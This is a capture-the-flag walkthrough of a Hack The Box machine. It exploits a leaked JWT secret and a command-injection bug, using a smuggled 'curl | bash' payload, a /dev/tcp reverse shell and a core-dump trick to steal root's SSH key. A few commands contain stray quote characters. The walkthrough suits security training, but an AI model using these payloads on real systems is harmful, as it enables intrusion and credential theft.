---
title: Secret Hunter Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---


## Enumeration

```java
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 3072 97af61441089b953f0803fd719b1e29c (RSA)
|_ 256 95ed658dcd082b55dd1751311e3e1812 (ECDSA)
|_ 256 337bc171d3330f924e835a1f5202935e (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open http Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User Exploit

Accessing the page, we find the option to download the source code of the page. Inside this folder we can see a .git.
If we make a ``git log, we can see how we have access to several commits ``, but the one that interests us most is the second one, because it tells us about security reasons. We see that it reports the following:
```json
diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

Analyzing, the other commits, we can see the following:
```json 
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
```

As you can see, this code is not well sanitized, because the file is passed directly without being filtered. In addition, we will also need a verifytoken to access the user "theadmin".

Digging further into the source code of the page, we find the /routes/auth.js file, specifically the following snippet:
```js
 // create jwt 
 const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
 res.header('auth-token', token).send(token);
```

Which is the one used to generate a JWT. 

This way, we already know what form the JWT has to have, so we are going to create one unsaod `jwt.io`.

Once we have it created, we are going to inject it in the web page with the help of curl:
```shell
curl -s -X GET -G "http://10.129.223.77:3000/api/logs" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMjM0NTY3ODkwIiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJ0ZXN0QGh0Yi5odGIifQ.0 O1YWIRBS47RTjBcepm3nvFjwhDXVWFE7PewEurbr58" --data-urlencode "file=/etc/passwd;curl 10.10.14.113:8000 | bash" | jq
```

But before that, we have to create a file called index.html like this:
```shell
#!/bin/bash
bash -i >&/dev/tcp/<IP>/<PORT> 0>&1
```

and share it using a python server. In this way, we will receive the reserse shell.

## Root Exploit

Looking for SUIDS: `find / -perm -u=s -type f 2>/dev/null` we see that it reports many files. However, the one that catches our attention is /opt/count, so let's investigate it.
However, being a binary, we are going to read its code in the `code.c` file. We see that it makes use of the `prctl(PR_SET_DUMPABLE, 1)` command, so we can intuit that there is something related to the core dump. Therefore, let's try to exploit it. To do this, we will only have to send a signal of type `SIGSEGV` to the application, so that this time it reads from the directory that we provide it:
```shell
/opt/count
/root/.ssh/id_rsa
ctrl+z
kill -SIGSEGV ``ps -e | grep -w "count"|awk -F ' ' ' '{print$1}'` `.
fg
```

Once we have that done, let's read the dumpeted core:
```shell
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash_unpacked
strings /tmp/crash_unpacked/CoreDump
```

And now we could see the id_rsa of the root user
